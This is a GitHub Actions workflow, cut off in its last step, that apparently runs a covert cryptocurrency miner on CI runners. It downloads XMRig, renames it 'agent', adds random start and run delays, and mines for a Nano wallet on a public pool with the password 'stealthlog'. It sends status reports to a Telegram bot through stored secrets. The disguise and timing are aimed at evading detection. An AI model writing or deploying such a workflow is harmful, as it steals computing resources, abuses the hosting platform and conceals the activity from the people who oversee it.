name: NANO Collector Loop

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  nano_collector:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Initialize
        run: echo "üõ∞Ô∏è Inisialisasi NANO collector..."

      - name: Install Dependencies
        run: sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id="$TG_CHAT_ID" \
            --data-urlencode text="üü¢ *NANO Collector aktif.*\nDurasi kerja acak 20‚Äì90 menit." \
            -d parse_mode=Markdown

      - name: Start Mining
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          mv xmrig-6.24.0 data-core
          cd data-core
          mv xmrig agent
          chmod +x agent

          DELAY=$((RANDOM % 300 + 30))
          echo "Tunda $DELAY detik..."
          sleep $DELAY

          ./agent -o xmrig.nanswap.com:3333 -a rx -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p stealthlog --randomx-no-rdmsr | tee log.txt &

          PID=$!
          WORKTIME=$((RANDOM % 5400 + 1200))
          echo "Aktif $WORKTIME detik..."
          sleep $WORKTIME
          kill $PID

      - name: Extract Logs and Report
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          set +e
          cd $(find . -type d
